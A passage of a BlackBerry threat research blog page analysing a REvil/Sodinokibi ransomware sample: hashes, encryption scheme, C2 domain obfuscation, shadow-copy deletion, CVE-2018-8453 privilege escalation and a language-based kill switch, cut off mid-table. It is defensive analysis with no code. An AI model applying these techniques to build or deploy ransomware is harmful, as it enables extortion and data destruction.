<!DOCTYPE HTML>
<html lang="en">
    <head>
	<meta charset="UTF-8"/>

	
	









    <!-- OneTrust Cookies Consent Notice Start -->






    <script src="https://cdn.cookielaw.org/scripttemplates/otSDKStub.js" data-document-language="true" type="text/javascript" charset="UTF-8" data-domain-script="6373c986-7725-4c54-9731-2a91bdd43107"></script>


<script type="text/javascript">
    function OptanonWrapper() { }
</script>

<!-- OneTrust Cookies Consent Notice End -->


















	<title>Threat Spotlight: REvil/Sodinokibi Ransomware</title>

	<script type="application/ld+json">
	{"@context":"https://schema.org","@type":"NewsArticle","mainEntityOfPage":{"@type":"WebPage","@id":"https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware"},"headline":null,"image":["/content/dam/blogs-blackberry-com/images/category/research-thumbnail-350x350-b.jpg","/content/dam/blogs-blackberry-com/images/blogs/2019/07/070319-sodinokibi-lrg.png"],"datePublished":"2019-07-03T10:12:00.000-07:00","author":{"@type":"Person","name":"The BlackBerry Research and Intelligence Team"},"publisher":{"@type":"Organization","name":"BlackBerry","logo":{"@type":"ImageObject","url":"https://blogs.blackberry.com/content/dam/blackberry-com/Images/logos/BlackBerry_Logo_Black_150.png"}}}
</script>


	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
	<meta name="description" content="REvil (AKA Sodinokibi/ Sodin) ransomware has infected thousands of organizations globably, and been connected to the same authors of the prolific GandCrab ransomware. This deep-dive blog contains an analysis of a REvil/Sodinokibi sample uncovered by the BlackBerry Research and Intelligence team."/>
	<meta name="keywords" content="Cybersecurity"/>
	

	<meta name="author" content="blogs.blackberry.com"/>
	<meta name="viewport" content="width=device-width, initial-scale=1"/>

	<link rel="icon" href="/etc.clientlibs/bbcom/clientlibs/clientlib-etc-legacy/resources/bbcom-aem-project/images/favicon.ico"/>
	<link rel="canonical" href="https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware"/>

	<meta property="og:url" content="https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware"/>
	<meta property="og:title" content="Threat Spotlight: REvil/Sodinokibi Ransomware"/>
	<meta property="og:description" content="REvil (AKA Sodinokibi/ Sodin) ransomware has infected thousands of organizations globably, and been connected to the same authors of the prolific GandCrab ransomware. This deep-dive blog contains an analysis of a REvil/Sodinokibi sample uncovered by the BlackBerry Research and Intelligence team."/>
	<meta property="og:type" content="article"/>
	<meta property="og:image" content="https://blogs.blackberry.com/content/dam/blogs-blackberry-com/images/blogs/2019/07/070319-sodinokibi-lrg.png"/>

	<meta name="twitter:card" content="summary_large_image"/>
	<meta name="twitter:site" content="@BlackBerry"/>
	<meta name="twitter:title" content="Threat Spotlight: REvil/Sodinokibi Ransomware"/>
	<meta name="twitter:description" content="REvil (AKA Sodinokibi/ Sodin) ransomware has infected thousands of organizations globably, and been connected to the same authors of the prolific GandCrab ransomware. This deep-dive blog contains an analysis of a REvil/Sodinokibi sample uncovered by the BlackBerry Research and Intelligence team."/>
	<meta name="twitter:image" content="https://blogs.blackberry.com/content/dam/blogs-blackberry-com/images/blogs/2019/07/070319-sodinokibi-lrg.png"/>

	

	
	
    
<link rel="stylesheet" href="/etc.clientlibs/blogs-bbcom/clientlibs/clientlib-site.min.54dd5587820b16101b4a5bc26ae87194.css" type="text/css">



	
    










	
		
<script>
(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TXGFP23');
</script>



<script async src="https://www.googletagmanager.com/gtag/js?id=AW-944900006"></script>

<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date()); gtag('config', 'AW-944900006');
</script>


		
	

	




<script src="https://kit.fontawesome.com/3c243f8233.js" crossorigin="anonymous"></script>


	
    
    

    
    
    
    


	
</head>
    <body class="page basicpage" data-enable-history="true">
        



	
		
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TXGFP23" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>


		
	

	


        
        
            



            

  
<!--
<sly data-sly-use.templatedContainer="com.day.cq.wcm.foundation.TemplatedContainer"
   data-sly-repeat.child=""
   data-sly-resource=""/>
-->

<header>
    




    
    
    
<!-- BEGIN DO NOT INDEX -->

    

<!-- skip to content: START -->
<a href='#' class='skipNav' tabindex="0">Skip Navigation</a>
<!-- skip to content: END-->
<!-- BEGIN DO NOT INDEX -->

  <nav class="blogs-navigationv2 bb-blogs-navbar navbar navbar-expand-lg navbar-dark bg-dark">
    <div class="container">
      <a class="navbar-brand" href="https://blogs.blackberry.com">
        <svg width="175px" height="30px" viewBox="0 0 175 30" version="1.1">
          <title>BlackBerry Logo</title>
          <g id="Creative" stroke="none" strokeWidth="1" fill="none" fillRule="evenodd">
              <g id="21-product-page-Protect-02.15.22" transform="translate(-91.000000, -10.000000)" fill="#FFFFFF" fillRule="nonzero">
                  <g id="BB_White" transform="translate(91.000000, 10.000000)">
                      <path d="M9.18042011,2.14285967 C9.18042011,1.19318021 8.5959918,-1.17624431e-15 6.16086942,-1.17624431e-15 C5.16247216,-1.17624431e-15 2.4107723,-1.17624431e-15 2.4107723,-1.17624431e-15 L1.33931598,4.94318021 C1.33931598,4.94318021 3.36046941,4.94318021 5.25986363,4.94318021 C8.32813214,4.91883014 9.18042011,3.48214033 9.18042011,2.14285967 Z" id="Shape"></path>
                      <path d="M19.2861873,2.14285967 C19.2861873,1.19318021 18.701759,-1.17624431e-15 16.2666366,-1.17624431e-15 C15.2682393,-1.17624431e-15 12.5165395,-1.17624431e-15 12.5165395,-1.17624431e-15 L11.4450831,4.94318021 C11.4450831,4.94318021 13.4662366,4.94318021 15.3412807,4.94318021 C18.4338993,4.91883014 19.2861873,3.48214033 19.2861873,2.14285967 Z" id="Shape_1_"></path>
                      <path d="M7.84110413,9.54545936 C7.84110413,8.59578874 7.25667582,7.4025997 4.82155344,7.4025997 C3.82315617,7.4025997 1.07145632,7.4025997 1.07145632,7.4025997 L5.68518084e-15,12.3457799 C5.68518084e-15,12.3457799 2.02115343,12.3457799 3.89619757,12.3457799 C6.96445725,12.3457799 7.84110413,10.88474 7.84110413,9.54545936 Z" id="Shape_2_"></path>
                      <path d="M17.9468713,9.54545936 C17.9468713,8.59578874 17.362443,7.4025997 14.9273206,7.4025997 C13.9289233,7.4025997 11.1772235,7.4025997 11.1772235,7.4025997 L10.1057671,12.3457799 C10.1057671,12.3457799 12.1269206,12.3457799 14.0263148,12.3457799 C17.0702244,12.3457799 17.9468713,10.88474 17.9468713,9.54545936 Z" id="Shape_3_"></path>
                      <path d="M28.5153164,6.55032938 C28.5153164,5.60064992 27.930888,4.40746971 25.4957657,4.40746971 C24.4973684,4.40746971 21.7456774,4.40746971 21.7456774,4.40746971 L20.6742211,9.35064992 C20.6742211,9.35064992 22.6953745,9.35064992 24.5704186,9.35064992 C27.6386695,9.32629985 28.5153164,7.88961005 28.5153164,6.55032938 Z" id="Shape_4_"></path>
                      <path d="M27.0542412,14.2694801 C27.0542412,13.3198006 26.4698129,12.1266204 24.0346816,12.1266204 C23.0362844,12.1266204 20.2845934,12.1266204 20.2845934,12.1266204 L19.213137,17.0698006 C19.213137,17.0698006 21.2342905,17.0698006 23.1093346,17.0698006 C26.1775943,17.0698006 27.0542412,15.6087696 27.0542412,14.2694801 Z" id="Shape_5_"></path>
                      <path d="M16.4857961,17.2889601 C16.4857961,16.3392807 15.9013678,15.1461005 13.4662366,15.1461005 C12.4678393,15.1461005 9.71614827,15.1461005 9.71614827,15.1461005 L8.64469195,20.0892807 C8.64469195,20.0892807 10.6658454,20.0892807 12.5408895,20.0892807 C15.6091492,20.0649306 16.4857961,18.6282496 16.4857961,17.2889601 Z" id="Shape_6_"></path>
                      <path d="M83.7683052,18.75 C83.5978459,19.11526 82.7455491,20.7711005 80.6026453,20.7711005 C78.1188139,20.7711005 77.1447667,18.701291 77.1447667,17.191551 C77.1447667,14.6590813 78.8493515,12.3944712 81.3575329,12.3944712 C84.0605238,12.3944712 84.6936523,14.4155717 84.7667113,14.7808317 L88.7359591,14.7808317 C88.9794775,13.2954417 87.786262,8.74187154 81.5036422,8.74187154 C76.9012483,8.74187154 73.2242102,12.4188213 73.2242102,17.3133014 C73.2242102,21.331161 75.7323917,24.4236913 80.3834769,24.4236913 C86.1790775,24.4236913 87.7375619,19.8701212 87.9323713,18.7499912 L83.7683052,18.7499912 L83.7683052,18.75 Z" id="Shape_7_"></path>
                      <path d="M53.2805356,19.8457799 C53.2805356,19.6022703 53.3535858,19.1639601 53.5483953,18.2629897 C53.7432047,17.3376603 56.5435959,4.40746971 56.5435959,4.40746971 L52.8178577,4.40746971 L49.7252479,18.6769498 C49.6034887,19.2857193 49.5304385,19.87013 49.5304385,20.3814904 C49.5304385,23.4983708 51.9412108,24.4237002 53.889314,24.4237002 C54.5711514,24.4237002 55.22863,24.3019498 55.3747393,24.2775909 C55.4477895,23.961031 56.0322266,21.2824609 56.0565767,21.1607105 C55.9835265,21.1607105 55.5695487,21.2094107 55.0825295,21.2094107 C53.6945045,21.2094107 53.2805356,20.625 53.2805356,19.8457799 Z" id="Shape_8_"></path>
                      <polygon id="Shape_9_" points="106.220152 8.76623044 101.033339 8.76623044 94.3367415 14.7808405 96.6014133 4.38311963 92.8269661 4.38311963 88.5654909 24.1071403 92.3155881 24.1071403 93.3626943 19.3100606 95.6760575 17.4837696 98.8660763 24.1071403 103.054492 24.1071403 98.5251576 15.2435096"></polygon>
                      <path d="M32.7767827,18.0194801 C33.0933514,16.6071403 35.7232832,4.38311963 35.7232832,4.38311963 C35.7232832,4.38311963 40.2769681,4.38311963 42.8338497,4.38311963 C47.9963131,4.38311963 49.2625788,7.25649924 49.2625788,8.98538995 C49.2625788,12.8327903 45.6342409,13.8555199 45.1959219,13.9772703 C45.6098908,14.1233708 47.971963,15.0487002 47.971963,18.0681802 C47.971963,21.3555199 44.9524035,24.107459 40.2526181,24.107459 C40.2526181,24.107459 38.5723834,24.107459 38.1097143,24.107459 C34.1404576,24.1314904 32.0218951,21.4042201 32.7767827,18.0194801 Z M43.905306,17.7759705 C43.905306,16.8506411 43.2965277,15.681811 40.666587,15.681811 L37.2330585,15.681811 L36.2103112,20.4545406 L40.1065088,20.4545406 C42.5903401,20.4545406 43.905306,19.3100606 43.905306,17.7759705 Z M45.1715718,9.8133102 C45.1715718,8.86363075 44.4410342,8.0357105 42.6633904,8.0357105 L38.8645931,8.0357105 L38.0122963,12.0292201 L41.9815529,12.0292201 C44.0757654,12.0292201 45.1715718,10.9821403 45.1715718,9.8133102 Z" id="Shape_10_"></path>
                      <path d="M104.515568,18.0194801 C104.832136,16.6071403 107.462068,4.38311963 107.462068,4.38311963 C107.462068,4.38311963 112.015753,4.38311963 114.572626,4.38311963 C119.735089,4.38311963 121.001364,7.25649924 121.001364,8.98538995 C121.001364,12.8327903 117.373026,13.8555199 116.934707,13.9772703 C117.348667,14.1233708 119.710748,15.0487002 119.710748,18.0681802 C119.710748,21.3555199 116.666847,24.107459 111.991394,24.107459 C111.991394,24.107459 110.311159,24.107459 109.84849,24.107459 C105.879234,24.1314904 103.76068,21.4042201 104.515568,18.0194801 Z M115.644091,17.7759705 C115.644091,16.8506411 115.035304,15.681811 112.405372,15.681811 L108.947493,15.681811 L107.924737,20.4545406 L111.820935,20.4545406 C114.329125,20.4545406 115.644091,19.3100606 115.644091,17.7759705 Z M116.910348,9.8133102 C116.910348,8.86363075 116.17981,8.0357105 114.377825,8.0357105 L110.603378,8.0357105 L109.751081,12.0292201 L113.720347,12.0292201 C115.81455,12.0292201 116.910348,10.9821403 116.910348,9.8133102 Z" id="Shape_11_"></path>
                      <path d="M146.789339,8.76623044 C142.820083,8.76623044 140.092742,11.1282408 139.191745,15.5357105 C138.802126,17.4350606 137.365401,24.1071403 137.365401,24.1071403 L141.091139,24.1071403 C141.091139,24.1071403 142.454814,17.7516204 142.893133,15.75487 C143.45322,13.1493501 144.841236,12.2483796 146.69193,12.2483796 C147.300717,12.2483796 147.665986,12.3214298 147.860795,12.3457799 C147.958196,11.8100694 148.493915,9.44805023 148.615674,8.88798965 C148.226055,8.86363957 147.592918,8.76623044 146.789339,8.76623044 Z" id="Shape_12_"></path>
                      <path d="M159.451988,30 L171.968527,8.76623044 L167.950571,8.76623044 L162.20367,18.75 L160.864354,8.74188037 C160.864354,8.74188037 158.818851,8.74188037 156.554179,8.74188037 C151.610875,8.74188037 149.054002,11.0064904 148.153005,15.316551 C147.690327,17.4594107 146.253602,24.1071315 146.253602,24.1071315 L149.97934,24.1071315 C149.97934,24.1071315 151.343015,17.8003117 151.903085,15.2678508 C152.438822,12.8084314 154.265166,12.0535613 156.23761,12.4675303 L157.016848,8.83928067 C157.601285,12.2727209 159.378911,23.2792113 159.378911,23.2792113 L155.482714,30 L159.451988,30 L159.451988,30 Z" id="Shape_13_"></path>
                      <path d="M64.0437813,17.5811699 C64.871728,17.4594195 67.2581502,17.0941595 67.599069,17.0454594 C67.5260099,17.313319 67.4529597,17.7029291 67.3799095,18.0194889 C66.9415816,19.8701388 65.0665375,21.063319 62.972325,21.063319 C61.633009,21.063319 60.8537712,20.3571492 60.8537712,19.5048788 C60.8294212,18.7987002 61.4869085,17.9464298 64.0437813,17.5811699 Z M62.6314151,13.5876603 C62.7288242,13.4415598 63.6785213,11.9561699 66.0649435,11.9561699 C67.5503688,11.9561699 68.3052565,12.4918804 68.3052565,13.1493501 C68.3052565,14.0746706 66.8198312,14.3181802 64.2142406,14.6834402 C59.7579648,15.3165598 56.9332236,16.7045406 56.9332236,19.9188301 C56.9332236,22.2077903 58.8326178,24.4237002 62.193096,24.4237002 C64.9934872,24.4237002 66.4545624,22.7435096 66.5763216,22.5974003 C66.6006717,23.0113604 66.6493719,23.62013 66.6737308,24.1071403 C66.9902906,24.1071403 69.5715222,24.1071403 70.5212282,24.1071403 C70.399469,23.4496706 70.1072504,22.1590901 70.5699283,20.1136307 C70.8134379,19.0422009 71.4952754,15.9496706 71.8361941,14.24513 C72.4936815,11.0064904 70.7160376,8.74188037 66.1867116,8.74188037 C60.3424108,8.74188037 58.6621673,12.9301906 58.3943076,13.5876603 L62.6314151,13.5876603 Z" id="Shape_14_"></path>
                      <path d="M131.862019,19.5292201 C131.715918,19.8214298 130.814921,21.0876603 128.793759,21.0876603 C125.871617,21.0876603 125.214139,18.6038995 125.28718,17.9464298 C126.845665,17.9464298 135.831275,17.9464298 136.659213,17.9464298 C136.732272,17.6785702 136.975791,16.6558493 136.975791,15.6087696 C136.975791,12.00487 134.540668,8.71753912 129.621714,8.71753912 C125.11673,8.71753912 121.512742,12.4918892 121.512742,16.9967592 C121.512742,21.3311787 124.118324,24.423709 128.745059,24.423709 C134.443259,24.423709 135.977393,19.9675391 136.123494,19.5292289 C135.100738,19.5292201 131.862019,19.5292201 131.862019,19.5292201 Z M129.670406,12.1266204 C132.178587,12.1266204 133.128284,13.6607105 133.030884,14.8782408 C131.594159,14.8782408 127.308342,14.8782408 125.84725,14.8782408 C126.042068,14.0990295 127.235283,12.1266204 129.670406,12.1266204 Z" id="Shape_15_"></path>
                      <path d="M171.979978,19.5027334 C173.12535,19.5027334 174.087452,20.4108465 174.087452,21.6216668 C174.087452,22.8557689 173.10243,23.7406002 171.979978,23.7406002 C170.834615,23.7406002 169.849603,22.8324871 169.849603,21.6216668 C169.849603,20.4108465 170.834615,19.5027334 171.979978,19.5027334 Z M171.979978,19.8520043 C171.017877,19.8520043 170.26193,20.620409 170.26193,21.6216668 C170.26193,22.6462064 171.017877,23.4146111 171.979978,23.4146111 C172.942098,23.4146111 173.675125,22.6694882 173.675125,21.6216668 C173.675125,20.620409 172.919178,19.8520043 171.979978,19.8520043 Z M171.52183,22.8557689 L171.155316,22.8557689 L171.155316,20.4108465 L172.071613,20.4108465 C172.644299,20.4108465 172.919178,20.620409 172.919178,21.109397 C172.919178,21.5518126 172.644299,21.7380934 172.277768,21.7846569 L172.964991,22.8557689 L172.552655,22.8557689 L171.911246,21.7846569 L171.49891,21.7846569 L171.49891,22.8557689 L171.52183,22.8557689 Z M171.521821,21.4819585 L171.957076,21.4819585 C172.415225,21.4819585 172.552664,21.3422501 172.552664,21.0861152 C172.552664,20.8532621 172.438127,20.7135538 172.025792,20.7135538 L171.521821,20.7135538 L171.521821,21.4819585 L171.521821,21.4819585 Z" id="Shape_16_"></path>
                  </g>
              </g>
          </g>
      </svg>
      </a>
      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <div class="collapse navbar-collapse" id="navbarNav">
        <ul class="navbar-nav">
          <li class="nav-item">
            <a class="nav-link" href="https://blogs.blackberry.com/en/category/cybersecurity">Cybersecurity</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="https://blogs.blackberry.com/en/category/automotive">Automotive & IOT</a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="https://blogs.blackberry.com/en/category/critical-event-management">Critical Communications</a>
          </li>
        </ul>


        <ul class="navbar-nav ml-auto">
          <li class="nav-item">

            <a class="nav-link open-search-btn" role="button">
              <svg aria-hidden="true" data-prefix="fa" data-icon="search" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg="">
                <path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z">
                </path>
              </svg>
            </a>
            <div id="searchOverlay" class="search-overlay">
              <span class="close-search-btn" title="Close Search">×</span>
              <div class="overlay-content">
                <form id="search-form">
                  <input id="search-form--input" description="Search" data-search-url="https://blogs.blackberry.com/en/search" type="text" placeholder="Search" name="search"/>
                  <button type="submit">
                    <svg aria-hidden="true" data-prefix="fa" data-icon="search" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg="">
                      <path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z">
                      </path>
                    </svg>
                  </button>
                </form>
              </div>
            </div>
          </li>
        </ul>
      </div>
    </div>
  </nav>



<!-- END DO NOT INDEX -->




<!-- END DO NOT INDEX -->

    
    
    <div class="hero">

      <div class="jumbotron mastheadDefault">
        <div class="hero-container narrower" style="background-image: url( \2f content\2f dam\2f blackberry-com\2fImages\2fsupport\2f bgs\2f bnr-blue-gradient-crop.jpg)">
          
          <div class="mask  "></div>

          <div class="container headings  l-align">
            <div class="col-lg-12">
          		




    
    
    <div class="blog-name-title">

  <div class="cmp-title ">
  
  
   <!-- <span class="highlighted-text-title blogs">INSIDE</span>
   <span class="normal-text-title">BlackBerry Blog</span> -->
   <span class="normal-text-title">BlackBerry Blog</span>
  
  
  
</div>
</div>



          	</div>
          </div>
      </div>
    </div>
</div>



</header><main>
    




    
    
    <div class="section">
  <section class="section     ">
    
    <div class="container">
        




    
    
    
<ol class="breadcrumb">
    <li class="breadcrumb-item ">
        <a href="/en.html">BlackBerry Blog</a>
    </li>

    <li class="breadcrumb-item active">
        Threat Spotlight: REvil/Sodinokibi Ransomware
    </li>
</ol>

    


      
    </div>
  </section>
    

</div>


    
    
    <div class="blogsection">
    <section class="section     ">
      
      <div class="container sectionPadding py-0">
           
      <div class="col-md-9 col-lg-9 col-sm-12">
          




    
    
    <div class="cmp cmp-title blog-title row">
  

<div class="col-md-12 col-lg-12 col-sm-12">
<h1>Threat Spotlight: REvil/Sodinokibi Ransomware</h1>
</div>



    
</div>


    
    
    <div class="categorydateauthor"><!--Pulling author bio from author page-->
<div class="categorydateauthor">
<span><a title="RESEARCH &amp; INTELLIGENCE" href="/en/category/research-and-intelligence">RESEARCH &amp; INTELLIGENCE</a> / </span><span class='publish-date'></span>07.03.19 / </span>

    <span class="author"><a href="/en/author/the-blackberry-research-and-intelligence-team">The BlackBerry Research and Intelligence Team</a></span>

</div></div>


    
    
    <div class="socialsharing">

<div class="socialSharing row">
	<ul class="socialSharing-icons">
		<li>
			<a href="https://x.com/intent/tweet?url=https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware&text=Threat%20Spotlight:%20REvil/Sodinokibi%20Ransomware&via=BlackBerry" title="Share on X" target="_blank" class="x-share">
				<span class="sr-only sr-only-focusable">Share on X</span>
				<span class="svgIcon-socialSharing svgIcon-socialSharing--tw" aria-hidden="true">
					<svg viewBox="0 0 1200 1227"><path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z"></path></svg>
				</span>
			</a>
		</li>
		<li>
			<a href="https://www.facebook.com/sharer/sharer.php?u=https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware" title="Share on Facebook" target="_blank" class="facebook-share">
				<span class="sr-only sr-only-focusable">Share on Facebook</span>
				<span class="svgIcon-socialSharing svgIcon-socialSharing--fb" aria-hidden="true">
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 264 512"><path d="M76.7 512V283H0v-91h76.7v-71.7C76.7 42.4 124.3 0 193.8 0c33.3 0 61.9 2.5 70.2 3.6V85h-48.2c-37.8 0-45.1 18-45.1 44.3V192H256l-11.7 91h-73.6v229"/></svg>
				</span>
			</a>
		</li>
		<li>
			<a href="https://www.linkedin.com/shareArticle?mini=true&url=https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware&title=Threat%20Spotlight:%20REvil/Sodinokibi%20Ransomware&summary=&source=blogs.blackberry.com" title="Share on LinkedIn" target="_blank" class="linkedin-share">
				<span class="sr-only sr-only-focusable">Share on LinkedIn</span>
				<span class="svgIcon-socialSharing svgIcon-socialSharing--li" aria-hidden="true">
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448.1 512"><path d="M100.3 448H7.4V148.9h92.9V448zM53.8 108.1C24.1 108.1 0 83.5 0 53.8S24.1 0 53.8 0s53.8 24.1 53.8 53.8-24.1 54.3-53.8 54.3zM448 448h-92.7V302.4c0-34.7-.7-79.2-48.3-79.2-48.3 0-55.7 37.7-55.7 76.7V448h-92.8V148.9h89.1v40.8h1.3c12.4-23.5 42.7-48.3 87.9-48.3 94 0 111.3 61.9 111.3 142.3V448h-.1z"/></svg>
				</span>
			</a>
		</li>
		<li>
			<a href="mailto:?subject=Threat%20Spotlight:%20REvil/Sodinokibi%20Ransomware&body=https://blogs.blackberry.com/en/2019/07/threat-spotlight-sodinokibi-ransomware" title="Email" class="email-share">
				<span class="sr-only sr-only-focusable">Email</span>
				<span class="svgIcon-socialSharing svgIcon-socialSharing--email" aria-hidden="true">
					<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"/></svg>
				</span>
			</a>
		</li>
	</ul>
</div>
</div>


    
    
    <div class="image">
  <div data-cmp-is="image" data-cmp-src="/en/2019/07/threat-spotlight-sodinokibi-ransomware/_jcr_content/main/par/sectionblog/par/image.coreimg{.width}.png/1596072829010/070319-sodinokibi-lrg.png" data-asset="/content/dam/blogs-blackberry-com/images/blogs/2019/07/070319-sodinokibi-lrg.png" data-asset-id="e73af23a-91d1-4179-96eb-44da360ddd01" class="cmp-image" itemscope itemtype="http://schema.org/ImageObject">
 
     
         
         
          
         <img src="/content/dam/blogs-blackberry-com/images/blogs/2019/07/070319-sodinokibi-lrg.png" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt/>
         
         <figcaption class="figure-caption" styles="display:table-caption;caption-side:bottom;"></figcaption>
          
     
 
 
 
</div>

    
</div>


    
    
    <div class="text">    
    
    <div class='cylance-blog-container'><p>Sodinokibi is a new ransomware that has infected thousands of clients through managed security service providers (MSSPs). It also exploited vulnerabilities in remote services such as Oracle WebLogic (CVE-2019-2725) and employed mass spam campaigns to proliferate during the Spring of 2019.</p> <p>BlackBerry® Cylance®'s Professional Services team recently observed an attack where the attackers leveraged Go2Assist via an MSSP to break into a customer's environment and deployed Passcape’s password recovery tool to steal credentials, before establishing a remote desktop connection via RDP into a domain controller, as well as connecting to the victim's Symantec server and disabling it.</p> <p>This paper contains fresh analysis of a related Sodinokibi sample uncovered by the BlackBerry Cylance threat research team.<i></i></p> <h2>Technical Analysis</h2> <h3>File</h3> <table border="1" cellspacing="0" cellpadding="0"> <tbody><tr><td width="133" valign="top"><p style="text-align: left;"><b>MD5</b></p> </td> <td width="475" valign="top"><p style="text-align: left;">e6566f78abf3075ebea6fd037803e176</p> </td> </tr><tr><td width="133" valign="top"><p style="text-align: left;"><b>SHA256</b></p> </td> <td width="475" valign="top"><p style="text-align: left;">861bc212241bcac9f8095c8de1b180b398057cbb2d37c9220086ffaf24ba9e08</p> </td> </tr><tr><td width="133" valign="top"><p style="text-align: left;"><b>Size</b></p> </td> <td width="475" valign="top"><p style="text-align: left;">160 KB (164,864 bytes)</p> </td> </tr><tr><td width="133" valign="top"><p style="text-align: left;"><b>File type</b></p> </td> <td width="475" valign="top"><p style="text-align: left;">PE32 executable for MS Windows (GUI) Intel 80386 32-bit</p> </td> </tr><tr><td width="133" valign="top"><p style="text-align: left;"><b>Alias</b></p> </td> <td width="475" valign="top"><p style="text-align: left;">Sodinokibi, Sodin, REvil</p> </td> </tr><tr><td width="133" valign="top"><p style="text-align: left;"><b>Compile time</b></p> </td> <td width="475" valign="top"><p style="text-align: left;">2019-06-10 15:29:32</p> </td> </tr></tbody></table> <h3><br> Features</h3> <ul> <li>File encryption using curve25519/Salsa20</li> <li>Key encryption using curve25519/AES-256-CTR</li> <li>Use of two public keys to encrypt the victim’s private key (possibly meaning that there are two entities that can decrypt the files independently)</li> <li>Use of pseudo-random generation algorithm based on AES for encryption keys, IVs and URLs</li> <li>C2 obfuscation via large domain list (1079 domains)</li> <li>Asymmetric key scheduling algorithm prevents need for C2</li> <li>Disables recovery and deletes volume shadow copies</li> <li>Exploits CVE-2018-8453 to perform privilege escalation</li> <li>Uses &quot;Heaven's Gate&quot; method to execute 64-bit exploit code under a 32-bit process (on 64-bit operating systems)</li> <li>Avoids executing on certain systems depending on the language code (largely related to former USSR countries)</li> </ul> <h3>Behavior Overview</h3> <p>Upon execution, Sodinokibi will create a mutex with a hardcoded name <b>Global\206D87E0-0E60-DF25-DD8F-8E4E7D1E3BF0</b> and decrypt an embedded configuration.</p> <p>If the <b>exp</b> parameter in the configuration is set, the malware will attempt to exploit <b>CVE-2018-8453</b> in order to gain SYSTEM privileges <i>(see the “Privilege escalation” section for more details)</i>. If not configured to execute the exploit, or if the attempt is unsuccessful, it will instead try to re-run itself as an administrator.</p> <p>Sodinokibi gathers some basic system information and saves it to the registry together with the generated encryption parameters. If the <b>dbg </b>option is not set in the config, the UI language and keyboard layout values are checked, and the malware will simply exit on systems which use one of the following language codes:</p> <table border="1" cellspacing="0" cellpadding="0" width="226"> <tbody><tr><td width="81" valign="top" bgcolor="#ECECEC"><p><b>Code</b></p> </td> <td width="146" valign="top" bgcolor="#ECECEC"><p><b>Language</b></p> </td> </tr><tr><td width="81" valign="top"><p><b>0x818</b></p> </td> <td width="146" valign="top"><p>Romanian</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x419</b></p> </td> <td width="146" valign="top"><p>Russian</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x819</b></p> </td> <td width="146" valign="top"><p>Russian (Moldova)</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x422</b></p> </td> <td width="146" valign="top"><p>Ukrainian</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x423</b></p> </td> <td width="146" valign="top"><p>Belarusian</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x425</b></p> </td> <td width="146" valign="top"><p>Estonian*</p> </td> </tr><tr><td width="81" valign="top"><p><b>0x426</b></p> 